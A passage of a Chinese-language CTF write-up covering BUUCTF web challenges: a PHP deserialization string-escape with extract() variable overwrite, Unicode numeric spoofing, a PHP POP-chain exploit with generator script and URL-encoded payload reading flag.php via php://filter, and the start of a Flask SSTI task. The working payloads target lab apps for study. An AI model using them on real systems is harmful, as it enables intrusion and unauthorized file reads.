class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>; <span class="comment">//将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>); <span class="comment">//将匹配到的替换为空,这里只是替换的化可以双写绕过</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;image_path&#x27;</span>] = (<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$userinfo</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先不传POST, 输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;guest&quot; [&quot;function&quot;]=&gt; string(10) &quot;show_image&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure><p>POST中输入:  这里发现不仅<code>_SESSION[user]</code>的值被修改了,<strong>而且<code>$_SESSION[&#39;function&#39;]</code>还被覆盖了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br><span class="line">输出:</span><br><span class="line">a:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(2) &#123; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure><p>POST中输入,这里可以向<code>_SESSION</code>中加入新的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=admin&amp;_SESSION[abc]=abcd</span><br><span class="line">输出</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:3:&quot;abc&quot;;s:4:&quot;abcd&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:3:&quot;abc&quot;;s:4:&quot;abcd&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;abc&quot;]=&gt; string(4) &quot;abcd&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br><span class="line">这里发现_SESSION中原有的function被覆盖了</span><br></pre></td></tr></table></figure><p>那么现在的目标是设法让最后的<code>img</code>失效,并且替换成我们自己可控的<code>img</code></p><p>这里给<code>_SESSION[a]</code>传<code>aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;</code> 第一个右双引号提前闭合本来包裹它的左双引号,最后使用<code>&#125;</code>提前闭合整个序列化的字符串,这样以来,原有的<code>img</code>就被排除在了外面, 但是从下面反序列化的结果也可以看出,反序列化之后,原来的<code>img</code>仍然在这个数组中,而我们传的那个<code>img</code>仍被算在<code>_SESSION[a]</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;sssss&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;sssss&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;sssss&quot; [&quot;a&quot;]=&gt; string(27) &quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot; [&quot;img&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure><p>那么现在需要利用一下前面的过滤函数,打乱前面的引号配对关系,让系统在反序列化时把我们自己传的这个<code>img</code>当作<code>_SESSION</code>中的元素</p><p>这里我们需要把序列化字符串中,<code>img</code>之前的内容,也就是 <code>&quot;;s:1:&quot;a&quot;;s:27:&quot;aa</code> 这一段都归入<code>_SESSION[user]</code>的值,这一段的长度是18,那么就让序列化字符串中<code>user</code>的值的长度显示为18, 所以这里给<code>user</code>传<code>flagflagflagphpphp</code>,这个串中的所有字符都会被过滤函数替换为空,所以处理后的序列化字符串也就变成了下面代码框中第二个这样. 这里:</p><p><code>s:4:&quot;user&quot;;s:18:&quot;</code><strong><code>&quot;;s:1:&quot;a&quot;;s:27:&quot;aa</code></strong><code>&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;</code> </p><p><code>user</code>的值实际上是加粗的这一段,其长度为18. 因此,在反序列化时,系统就会按照18的长度去匹配后面的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;flagflagflagphpphp&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure><p>但上面最后反序列化输出了<code>false</code>,其原因是经过上面的处理过后, 这个数组实际上就剩两个参数了(<code>user</code>和我们自己传的<code>img</code>),但序列化的字符串起始还标记着有三个参数,自然反序列化就失败了</p><p>所以这里再从<code>img</code>后面添加一个无关紧要的参数即可</p><p>可以看到这里反序列化成功了,且成功地将原有的<code>img</code>替换成了我们可控的<code>img</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line">输出:</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;flagflagflagphpphp&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(18) &quot;&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot; [&quot;img&quot;]=&gt; string(5) &quot;abcde&quot; [&quot;b&quot;]=&gt; string(1) &quot;c&quot; &#125;</span><br></pre></td></tr></table></figure><p>所以拿到这道题里,把<code>img</code>的值换成我们所需读取的<code>d0g3_f1ag.php</code>的<code>base64</code>编码: 注意长度那里也得改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line">源码里输出:</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么继续去读取这个文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line"></span><br><span class="line">输出flag</span><br></pre></td></tr></table></figure><p>这里用到了字符串逃逸,变量覆盖. 提前闭合引号和花括号,理解起来有点像<code>sql</code>注入时的一些场景</p><br><hr><br><h1 id="unicode欺骗-Unicorn-shop"><a href="#unicode欺骗-Unicorn-shop" class="headerlink" title="[unicode欺骗]Unicorn shop"></a>[unicode欺骗]Unicorn shop</h1><img src="/images/buuctf-web/image-20221021115425088-1667047819736138.png" alt="image-20221021115425088" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;price=2  ---Wrong commodity!</span><br><span class="line">id=1&amp;price=a  ---Error parsing money!</span><br><span class="line">id=1&amp;price=a2 ---Only one char(?) allowed!</span><br><span class="line">id=&amp;price=2  ---No commodity found!</span><br><span class="line">id=1&amp;price=</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/tornado/web.py&quot;, line 1541, in _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File &quot;/app/sshop/views/Shop.py&quot;, line 34, in post</span><br><span class="line">    unicodedata.numeric(price)</span><br><span class="line">TypeError: need a single Unicode character as parameter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=4&amp;price=0  --You don&amp;#39;t have enough money!</span><br></pre></td></tr></table></figure><p>只能买第四件商品才不会报错, 而且<code>price</code>还只能输入1个字符,无法输入1337</p><img src="/images/buuctf-web/image-20221021114227729.png" alt="image-20221021114227729" style="zoom:80%;" /><p><strong><code>unicode</code>欺骗</strong>,</p><p>去<a href="https://unicode-table.com/en/search/?q=thousand">unicode-table</a>找一个比1337大的单个字符</p><img src="/images/buuctf-web/image-20221021115803524-1667047819736137.png" alt="image-20221021115803524" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221021115650004-1667047819736139.png" alt="image-20221021115650004" style="zoom:67%;" /><br><hr><br><h1 id="反序列化pop链-Ezpop"><a href="#反序列化pop链-Ezpop" class="headerlink" title="[反序列化pop链]Ezpop"></a>[反序列化pop链]Ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>突破口是<code>Modifier</code>类的<code>append</code>方法, 进行文件包含</p><p>调用<code>append</code>的是<code>__invoke</code>, <strong>这个魔术方法在尝试将对象调用为函数时触发.</strong> </p><p>为了达到最终<code>include</code>的目的调用它的时候需要<code>Modifier</code>中的<code>var</code>属性值需要是我们要读取的<code>flag.php</code></p><p>那么现在需要找哪里能够把变量当函数调用, 这里找到第43行,<code>Test</code>类的<code>__get</code>方法,这个魔术方法在<strong>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</strong></p><p>那么这里就需要<code>$function</code>的值是<code>Modifier</code>的一个对象</p><p>42行,<code>function变量</code>赋值于<code>Test</code>的<code>p</code>属性,它初始化时是一个新建立的数组</p><p>那么如何调用<code>__get</code>呢,这里看到24行的<code>__toString</code>中调用了尚未初始化的的<code>str</code></p><p>最后<code>Show</code>类中<code>__wakeup</code>方法的<code>preg_match</code>能够触发<code>__toString</code>方法</p><p>最后反序列化一个<code>show</code>类的对象,就能够触发其<code>__wakeup</code>方法</p><p>那么把上述过程反推,就可以构造pop链:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$a</span>; </span><br><span class="line"><span class="variable">$c</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;source = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">过程分析: 首先这里拿到了$d序列化后的字符串,当这个字符串送到题目程序里进行反序列化时:</span></span><br><span class="line"><span class="comment">1.触发$d的__wakeup, 对$d-&gt;source,也就是$c进行正则匹配,这个过程把$c当成字符串,所以触发了$c的__tostring</span></span><br><span class="line"><span class="comment">2.$c的__tostring返回的是$c-&gt;str-&gt;source,而$c-&gt;str是$b,所以这里返回的是$b-&gt;str,而$b中这个属性并不存在,所以触发了$b的__get方法.</span></span><br><span class="line"><span class="comment">3.$b的__get方法会将$b-&gt;p,也就是$a当作函数执行,由此触发$a的__invoke方法</span></span><br><span class="line"><span class="comment">4.$a的__invoke方法调用$a的append方法,最终执行了include(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</span><br><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="SSTI-绕过过滤读取config-shrine"><a href="#SSTI-绕过过滤读取config-shrine" class="headerlink" title="[SSTI,绕过过滤读取config]shrine"></a>[SSTI,绕过过滤读取config]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="comment"># 注入点:</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>) </span><span class="comment">#这里可以根据用户输入的对应位置的url来获取对应位置的变量shrine值(path是类型)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#把括号替换成空值</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) <span 